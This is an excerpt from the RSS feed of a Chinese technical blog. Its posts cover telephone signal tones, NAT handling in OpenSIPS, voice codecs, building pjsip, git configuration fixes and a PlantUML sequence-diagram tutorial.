&lt;p&gt;【现象】打同一个号码，有些手机能听到回铃音，有些手机听不到回铃音&lt;!-- raw HTML omitted --&gt;【排查思路】&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;有些手机volte开启后，可能会导致无回铃音，所以可以关闭volte试试&lt;/li&gt;
&lt;li&gt;被叫的运营商，主叫手机的运营商&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;参考资料&#34;&gt;参考资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E5%9B%9E%E9%93%83%E9%9F%B3&#34;&gt;https://zh.wikipedia.org/wiki/%E5%9B%9E%E9%93%83%E9%9F%B3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://baike.baidu.com/item/%E5%9B%9E%E9%93%83%E9%9F%B3/1014322&#34;&gt;https://baike.baidu.com/item/%E5%9B%9E%E9%93%83%E9%9F%B3/1014322&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.it9000.cn/tech/CTI/signal.html&#34;&gt;http://www.it9000.cn/tech/CTI/signal.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>几种常用电话信号音的含义</title>
      <link>https://wdd.js.org/opensips/ch2/early-media-type/</link>
      <pubDate>Wed, 18 Sep 2019 09:10:24 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch2/early-media-type/</guid>
      <description>&lt;h1 id=&#34;几种常用电话信号音的含义&#34;&gt;几种常用电话信号音的含义&lt;/h1&gt;
&lt;p&gt;信号频率：&lt;!-- raw HTML omitted --&gt;（450±25）HZ：拨号音、回铃音、忙音、长途通知音、空号音&lt;!-- raw HTML omitted --&gt;（950±25）HZ：催挂音&lt;/p&gt;
&lt;h1 id=&#34;拨号音&#34;&gt;拨号音&lt;/h1&gt;
&lt;p&gt;摘机后受话器中便有一种“嗡&amp;ndash;”的连续音，这种声音就是拨号音，它表示自动交换机或对方呼叫中心系统已经做好了接续准备，允许用户拨号&lt;/p&gt;
&lt;h1 id=&#34;回铃音&#34;&gt;回铃音&lt;/h1&gt;
&lt;p&gt;拨完被叫号，若听到“嘟&amp;ndash;嘟&amp;ndash;”的断续音（响1s，断4s），便是回铃音，表示被叫话机正在响铃，可静候接话；如果振铃超过10余次，仍无人讲话，说明对方无人接电话，应放好手柄稍后再拨。&lt;/p&gt;
&lt;h1 id=&#34;忙音&#34;&gt;忙音&lt;/h1&gt;
&lt;p&gt;当主叫用户在拨号过程中或拨完被叫电话号码后，若听到“嘟、嘟、嘟……”的短促音（响0.35s，断0.35s），这就是忙音，表示线路已经被占满或被叫电话机正在使用&lt;/p&gt;
&lt;h1 id=&#34;长途通知音&#34;&gt;长途通知音&lt;/h1&gt;
&lt;p&gt;当主叫用户和被叫用户正在进行市内通话时，听到“嘟、嘟、嘟……”的短促音（响0.2s，断0.2s，响0.2s，间歇0.6s），这便是长途电话通知音，表示有长途电话插入，提醒主被叫用户双方尽快结束市内通话，准备接听长途电话。&lt;/p&gt;
&lt;h1 id=&#34;空号音&#34;&gt;空号音&lt;/h1&gt;
&lt;p&gt;当用户拨完号码后听到不等间隔断续信号音（重复3次0.1s响，0.1s断后，0.4s响0.4s断），这便是空号音，表示通知主叫用户所呼叫的被叫号码为空号或受限制的号码。&lt;/p&gt;
&lt;h1 id=&#34;催挂音&#34;&gt;催挂音&lt;/h1&gt;
&lt;p&gt;如果用户听到连续信号音，响度变化为5级，由低级逐步升高，则是催挂音。通知久不挂机的用户迅速挂机。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.it9000.cn/tech/CTI/signal.html&#34;&gt;http://www.it9000.cn/tech/CTI/signal.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Royal TSX git status 输出乱码</title>
      <link>https://wdd.js.org/posts/2019/09/msx8i9/</link>
      <pubDate>Tue, 17 Sep 2019 16:36:38 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/msx8i9/</guid>
      <description>&lt;h1 id=&#34;问题描述&#34;&gt;问题描述&lt;/h1&gt;
&lt;p&gt;连接服务器时的报警&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-bash: 警告:setlocale: LC_CTYPE: 无法改变区域选项 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UTF-8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: 没有那个文件或目录
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;git status 发现本来应该显示 &amp;lsquo;on brance master&amp;rsquo; 之类的地方，居然英文也乱码了，都是问号。&lt;/p&gt;
&lt;h1 id=&#34;解决方案&#34;&gt;解决方案&lt;/h1&gt;
&lt;p&gt;vim /etc/environment , 然后加入如下代码，然后重新打开ssh窗口&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LC_ALL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;en_US.UTF-8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LANG&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;en_US.UTF-8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>git取消设置http代理</title>
      <link>https://wdd.js.org/posts/2019/09/yko32n/</link>
      <pubDate>Tue, 17 Sep 2019 16:06:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/yko32n/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global --unset http.proxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>NAT解决方法</title>
      <link>https://wdd.js.org/opensips/ch1/fix-nat/</link>
      <pubDate>Tue, 17 Sep 2019 08:58:52 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/fix-nat/</guid>
      <description>&lt;h1 id=&#34;解决信令的过程&#34;&gt;解决信令的过程&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;NAT检测&lt;/li&gt;
&lt;li&gt;使用rport解决Via&lt;/li&gt;
&lt;li&gt;在初始化请求和响应中修改Contact头&lt;/li&gt;
&lt;li&gt;处理来自NAT内部的注册请求&lt;/li&gt;
&lt;li&gt;Ping客户端使NAT映射保持打开&lt;/li&gt;
&lt;li&gt;处理序列化请求&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;实现nat检测nat_uac_test&#34;&gt;实现NAT检测 nat_uac_test&lt;/h1&gt;
&lt;p&gt;使用函数 nat_uac_test&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 搜索Contact头存在于RFC &lt;span style=&#34;color:#ae81ff&#34;&gt;1918&lt;/span&gt; 中的地址
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; 检测Via头中的received参数和源地址是否相同
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; 最顶部的Via出现在RFC1918 / RFC6598地址中
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; 搜索SDP头出现RFC1918 / RFC6598地址
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; 测试源端口是否和Via头中的端口不同
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; 比较Contact中的地址和源信令的地址
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; 比较Contact中的端口和源信令的端口
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上边的测试都是可以组合的，并且任何一个测试通过，则返回true。&lt;/p&gt;
&lt;p&gt;例如下面的测试19，实际上是1+2+16三项测试的组合&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nat_uac_test&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;19&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用rport和receive参数标记via头&#34;&gt;使用rport和receive参数标记Via头&lt;/h1&gt;
&lt;p&gt;从NAT内部出去的呼叫，往往可能不知道自己的出口IP和端口，只有远端的SIP服务器收到请求后，才能知道UAC的真是出口IP和端口。出口IP用received=x.x.x.x，出口端口用rport=xx。当有消息发到UAC时，应当发到received和rport所指定的地址和端口。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 原始的Via&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Via: SIP/2.0/UDP 192.168.4.48:5062;branch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;z9hG4bK523223793;rport
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 经过opensips处理后的Via&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Via: SIP/2.0/UDP 192.168.4.48:5062;received&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.4.48;branch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;z9hG4bK523223793;rport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5062&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;修复contact头&#34;&gt;修复Contact头&lt;/h1&gt;
&lt;p&gt;Via头和Contact头是比较容易混淆的概念，但是两者的功能完全不同。Via头使用来导航183和200响应应该如何按照原路返回。Contact用来给序列化请求，例如BYE和UPDATE导航。如果Contact头不正确，可能会导致呼叫无法挂断。那么就需要用fix_nated_contact()函数去修复Contact头。另外，对于183和200的响应也需要去修复Contact头。&lt;/p&gt;
&lt;h1 id=&#34;处理注册请求&#34;&gt;处理注册请求&lt;/h1&gt;
&lt;h1 id=&#34;rfc-1918-地址组&#34;&gt;RFC 1918 地址组&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;10.0.0.0        -   10.255.255.255  (10/8 prefix)&lt;/li&gt;
&lt;li&gt;172.16.0.0      -   172.31.255.255  (172.16/12 prefix)&lt;/li&gt;
&lt;li&gt;192.168.0.0     -   192.168.255.255 (192.168/16 prefix)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.rfcreader.com/#rfc1918&#34;&gt;http://www.rfcreader.com/#rfc1918&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>常见媒体流编码及其特点</title>
      <link>https://wdd.js.org/opensips/ch4/media-codec/</link>
      <pubDate>Fri, 13 Sep 2019 09:04:12 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch4/media-codec/</guid>
      <description>&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;编码&lt;/th&gt;
          &lt;th&gt;带宽&lt;/th&gt;
          &lt;th&gt;MOS&lt;/th&gt;
          &lt;th&gt;环境&lt;/th&gt;
          &lt;th&gt;特点&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;G.711&lt;/td&gt;
          &lt;td&gt;64 kbps&lt;/td&gt;
          &lt;td&gt;4.45&lt;/td&gt;
          &lt;td&gt;LAN/WAN&lt;/td&gt;
          &lt;td&gt;语音质量高，适合对接网关&lt;/td&gt;
          &lt;td&gt;G.711实际上就是PCM, 是最基本的编码方式。PCM又分为两类PCMA(g711a), PCMU(g711u)。&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;中国使用的是PCMA&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;G.729&lt;/td&gt;
          &lt;td&gt;8 kbps&lt;/td&gt;
          &lt;td&gt;4.04&lt;/td&gt;
          &lt;td&gt;WAN&lt;/td&gt;
          &lt;td&gt;带宽占用率很小，同时能保证不错的语音质量&lt;/td&gt;
          &lt;td&gt;分为G729a和G729b两种，G729之所以带宽占用是G711的1/8, 是因为G729的压缩算法不同。G729传输的不是真正的语音，而是语音压缩后的结果。&lt;!-- raw HTML omitted --&gt;G729的编解码是由专利的，也就说不免费。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;G.722&lt;/td&gt;
          &lt;td&gt;64 kbps&lt;/td&gt;
          &lt;td&gt;4.5&lt;/td&gt;
          &lt;td&gt;LAN&lt;/td&gt;
          &lt;td&gt;语音质量高 HD&lt;/td&gt;
          &lt;td&gt;hd语音&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;GSM&lt;/td&gt;
          &lt;td&gt;13.3 kbps&lt;/td&gt;
          &lt;td&gt;3.01&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;iLBA&lt;/td&gt;
          &lt;td&gt;13.3 15.2&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;抗丢包&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;OPUS&lt;/td&gt;
          &lt;td&gt;6-510 kbps&lt;/td&gt;
          &lt;td&gt;-&lt;/td&gt;
          &lt;td&gt;INTERNET&lt;/td&gt;
          &lt;td&gt;OPUS的带宽范围跨度很广，适合语音和视屏&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;MOS值，Mean Opinion Score，用来定义语音质量。满分为5分，最低1分。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;MOS&lt;/th&gt;
          &lt;th&gt;质量&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;5&lt;/td&gt;
          &lt;td&gt;极好的&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4&lt;/td&gt;
          &lt;td&gt;不错的&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;还行吧&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;中等差&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;最差&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;通常的打包是20ms一个包，那么一秒就会传输1000/20=50个包。如果采样评率是8000Hz,  那么每个包的会携带 8000/50=160个采样数据。在PCMA或者PCMU中，每个采样数据占用1字节。因此20ms的一个包就携带160字节的数据。&lt;/p&gt;</description>
    </item>
    <item>
      <title>pjsip</title>
      <link>https://wdd.js.org/opensips/tools/pjsip/</link>
      <pubDate>Sun, 08 Sep 2019 13:02:46 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/pjsip/</guid>
      <description>&lt;h1 id=&#34;环境说明&#34;&gt;环境说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;centos7.6 docker 容器&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;过程&#34;&gt;过程&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://www.pjsip.org/release/2.9/pjproject-2.9.zip
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unzip pjproject-2.9.zip
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd pjproject-2.9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod +x configure aconfigure
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install gcc gcc-c++ make -y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make dep
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install centos-release-scl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install rh-python36
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.pjsip.org/download.htm&#34;&gt;https://www.pjsip.org/download.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://trac.pjsip.org/repos/wiki/Getting-Started&#34;&gt;https://trac.pjsip.org/repos/wiki/Getting-Started&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://trac.pjsip.org/repos/wiki/Getting-Started/Autoconf&#34;&gt;https://trac.pjsip.org/repos/wiki/Getting-Started/Autoconf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://linuxize.com/post/how-to-install-python-3-on-centos-7/&#34;&gt;https://linuxize.com/post/how-to-install-python-3-on-centos-7/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>关注点分离的问题</title>
      <link>https://wdd.js.org/posts/2019/09/xi7kpf/</link>
      <pubDate>Fri, 06 Sep 2019 12:37:25 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/xi7kpf/</guid>
      <description>&lt;p&gt;前端组件化时，有个很时髦的词语叫做关注点分离，这个用在组件上比较好，我们可以把大的模块分割成小的模块，降低了整个模块的复杂度。&lt;/p&gt;
&lt;p&gt;但是有时候，我觉得关注点分离并不好。这个不是指在代码开发过程，而是解决问题的过程。&lt;/p&gt;
&lt;h1 id=&#34;关注点分离的处理方式&#34;&gt;关注点分离的处理方式&lt;/h1&gt;
&lt;p&gt;假如我要解决问题A，但是在解决过程中，我发现了一个我不知道的东西B, 然后我就去研究这B是什么东西，然后接二连三，我从B一路找到了Z。&lt;/p&gt;
&lt;p&gt;然后在这个解决过程耽误一段时候后，才想起来：我之前是要解决什么问题来着？？&lt;/p&gt;
&lt;h1 id=&#34;关注点集中的处理方式&#34;&gt;关注点集中的处理方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;不要再深究的路径上走的太深&lt;/li&gt;
&lt;li&gt;在走其他路径时，也不要忘记最后要回到A点&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>TCP和UDP的区别畅想</title>
      <link>https://wdd.js.org/posts/2019/09/vc8oxs/</link>
      <pubDate>Thu, 05 Sep 2019 14:59:32 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/vc8oxs/</guid>
      <description>&lt;p&gt;web服务器如果是基于tcp的，那么用来监听端口端口例如80，一定只能用来接收消息，而不能从这个端口主动发消息出去。&lt;/p&gt;
&lt;p&gt;但是udp服务器就不一样了，同一端口，即可以用来做listen的端口，也可以从这个端口主动发消息出去。&lt;/p&gt;</description>
    </item>
    <item>
      <title>PlantUML教程 包学包会</title>
      <link>https://wdd.js.org/posts/2019/09/hvscve/</link>
      <pubDate>Thu, 05 Sep 2019 12:55:27 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/hvscve/</guid>
      <description>&lt;p&gt;我觉得PlantUML非常适合绘制时序图，先给个完整的例子，我经常会用到的PlantUML画SIP请求时序图。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@startuml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;autonumber
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;alice-&amp;gt;bob: INVITE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bob-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#green]&amp;gt;alice: 180 Ringing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bob-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#green]&amp;gt;alice: 200 OK&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; talking &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bob-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#green]&amp;gt;alice: BYE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;alice-&amp;gt;bob: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@enduml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/09/hvscve/2022-10-29-19-59-29.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;简单箭头&#34;&gt;简单箭头&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ndash;&amp;gt; 虚线箭头&lt;/li&gt;
&lt;li&gt;-&amp;gt; 简单箭头&lt;/li&gt;
&lt;li&gt;-[#red]&amp;gt; 带颜色的箭头&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@startuml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;alice-&amp;gt;bob: INVITE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bob--&amp;gt;alice: &lt;span style=&#34;color:#ae81ff&#34;&gt;180&lt;/span&gt; Ringing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@enduml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/09/hvscve/2022-10-29-19-59-46.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;声明参与者顺序&#34;&gt;声明参与者顺序&lt;/h1&gt;
&lt;p&gt;先使用participant关键字声明了bob， 那么bob就会出现在最左边&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@startuml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;participant bob
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;participant alice
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;alice-&amp;gt;bob: INVITE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bob-&amp;gt;alice: &lt;span style=&#34;color:#ae81ff&#34;&gt;180&lt;/span&gt; Ringing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@enduml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/09/hvscve/2022-10-29-19-59-53.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;声明参与者类型&#34;&gt;声明参与者类型&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;actor&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;boundary&lt;/code&gt;&lt;/li&gt;
